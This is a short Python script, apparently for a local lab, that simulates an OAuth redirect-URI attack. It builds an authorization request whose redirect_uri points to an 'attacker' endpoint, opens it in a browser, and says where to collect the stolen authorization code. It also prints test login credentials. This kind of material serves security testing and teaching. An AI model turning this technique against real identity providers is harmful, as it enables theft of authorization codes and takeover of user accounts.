import requests
import urllib.parse
import webbrowser

# Configuration
IDP_AUTH_URL = "http://localhost:5001/oauth/authorize"
ATTACKER_SERVER = "http://localhost:5000/attacker"
CLIENT_ID = "client789"
STATE = "malicious123"


def simulate_attack():
    # Craft malicious OAuth request
    malicious_redirect = urllib.parse.quote(ATTACKER_SERVER)
    auth_url = f"{IDP_AUTH_URL}?client_id={CLIENT_ID}&redirect_uri={malicious_redirect}&response_type=code&state={STATE}"

    print("Simulating OAuth redirect URI attack...")
    print(f"Malicious URL: {auth_url}")

    # Open browser to simulate user clicking the link
    webbrowser.open(auth_url)
    print("Browser opened. Log in with username 'user3' and password 'pass123'.")
    print(f"Check http://localhost:5000/attacker for the stolen authorization code.")


if __name__ == "__main__":
    simulate_attack()